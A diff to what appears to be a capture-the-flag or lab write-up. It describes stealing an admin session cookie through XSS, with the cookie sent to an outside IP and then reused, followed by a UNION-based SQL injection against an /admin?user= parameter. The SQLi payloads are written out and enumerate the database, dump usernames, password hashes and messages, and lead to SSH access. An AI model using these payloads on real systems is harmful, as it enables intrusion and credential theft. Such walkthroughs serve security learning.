@@ -9,28 +9,39 @@ The following payload creates a new Image object in the DOM of the current page 
 As a result, the browser will make an HTTP request to this external website (192.168.149.128) and the URL will contain the session cookie.
 
 When the admin opens the message, his cookies will be sent to us. 
-And there we go, I just changed my cookies to his and we became a admin, this proves that XSS is a serious vulnerability. 
+And there we go, I just changed my cookies to his and we became a admin, now we can acess /admin page. This proves that XSS is a serious vulnerability. 
 
   // Database enum VIA SQLi
+  
+This site has really poor menu, we cant upload our reverse shell anywhere, but we can check for SQLi in URL.
+I found info about users, when i click on somebody there is syntax in URL: /admin?user=1 
 
-This site has really poor menu, we cant upload our reverse shell anywhere, but we can check for SQLi in URL. 
 Error gives us information about the database and proves that it occurs.
 
 We try to figure out how many columns exist in the databse, I used order by and if error will apear, that means this column does not exist 
 I know now there's 4 columns, I can just substitute them to a interesting value such a usernames or passwords, so I do something like this now:
-user=33223 union select @@version,2,3,4
+/admin?user=33223 union select @@version,2,3,4
 
 Then I can get a databse 
-user=33223 union select database(),2,3,4
+/admin?user=33223 union select database(),2,3,4
 
 Note:This union statement will work because user number is incorrect. 
 
 I'll try to get name of tables from information schema.tables
-24545 union select (select group_concat(table_name)from information_schema.tables where table_schema=database()),2,3,4
+/admin?24545 union select (select group_concat(table_name)from information_schema.tables where table_schema=database()),2,3,4
 
 Then lets get column names from information schema.columns
-24545 union select (select group_concat(table_name,"--",column_name)from information_schema.columns where table_schema=database()),2,3,4
+/admin?user=24545 union select (select group_concat(table_name,"--",column_name)from information_schema.columns where table_schema=database()),2,3,4
 
 Since I concat those two, our output looks like: table-column, table-column, table-column.
 
+Ok then I got users and passwords, similarly to above
+/admin?user=24545 union select (select group_concat(id,"--",username,"--",password)from users),2,3,4
+
+Unfortunately the password hashes are really strong and I cant crack them
+
+What we can do else is extract content of messages table via SQLi 
+/admin?user=24545 union select (select group_concat(user_to,"--",message_content)from messages),2,3,4
+
+Ok, from messages we are able to see password for ssh for another user, we just log into his ssh. 
 
